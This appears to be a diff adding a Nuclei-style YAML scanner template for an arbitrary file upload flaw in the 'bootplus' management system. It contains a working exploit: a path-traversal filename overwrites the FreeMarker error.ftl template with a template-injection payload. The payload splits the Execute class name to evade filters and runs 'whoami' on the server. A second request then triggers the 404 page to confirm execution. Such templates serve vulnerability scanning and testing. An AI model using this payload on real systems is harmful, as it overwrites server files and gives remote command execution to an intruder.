@@ -1,0 +1,56 @@
+id: poc-yaml-bootplus-file-upload
+info:
+  name: bootplus管理系统 /file/upload 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 文件上传
+
+variables:
+  t1: '{{rand_int(111000,999000)}}'
+  t2: '{{rand_int(10,100)}}'
+  t3: '{{to_number(t1) - to_number(t2)}}'
+
+flow: http(1) && http(2)
+
+http:
+  - id: "1"
+    method: POST
+    path:
+      - "{{BaseURL}}/file/upload"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryn2bv6kDMJcYthUEO
+    body: |
+      ------WebKitFormBoundaryn2bv6kDMJcYthUEO
+      Content-Disposition: form-data; name="file"; filename="/../../../../bootplus-master/target/classes/templates/error.ftl"
+      Content-Type: image/jpeg
+      
+      <#assign a="freemarker.te">
+      <#assign a2="${a}mplate.utility.Execute">
+      <#assign sum = {{t1}} - {{t2}}>
+      vulnerability: ${sum}
+      <#assign value="${a2}"?new()>${value("whoami")}
+      ------WebKitFormBoundaryn2bv6kDMJcYthUEO--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - contains(json("body.filePath"), "classes/templates/error.ftl")
+
+  - id: "2"
+    method: GET
+    path:
+      - "{{BaseURL}}/xxuhuxx{{t1}}randvvcgcf"
+    headers:
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 404
+      - type: word
+        part: body
+        words:
+          - "vulnerability: {{t3}}"
